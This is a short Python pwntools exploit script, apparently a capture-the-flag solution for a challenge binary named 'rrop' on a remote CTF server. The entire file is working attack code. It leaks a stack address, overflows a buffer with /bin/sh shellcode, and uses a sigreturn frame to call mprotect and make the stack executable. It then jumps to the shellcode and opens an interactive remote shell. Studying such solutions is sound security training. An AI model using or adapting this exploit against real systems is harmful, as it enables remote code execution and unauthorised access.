from pwn import *

#r = process("./rrop")
r = remote("rrop.darkarmy.xyz",7001)
context.arch = "amd64"

syscall = 0x4007d2
mov_eax = 0x4007dc
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

print r.recvuntil("@")
leak = r.recv(14)
buf = int(leak,16)
stack = int(leak[0:11]+"000",16)

def pad(s):
    return "a"*(216-len(s))

payload=shellcode
payload+=pad(shellcode)
payload+=p64(mov_eax)
payload+=p64(syscall)

frame = SigreturnFrame() 
frame.rax = 10
frame.rdi = stack
frame.rsi = 2000
frame.rdx = 7
frame.rsp = buf+len(payload)+248
frame.rip = syscall

payload += str(frame)
payload += p64(buf)

r.sendline(payload)

r.interactive()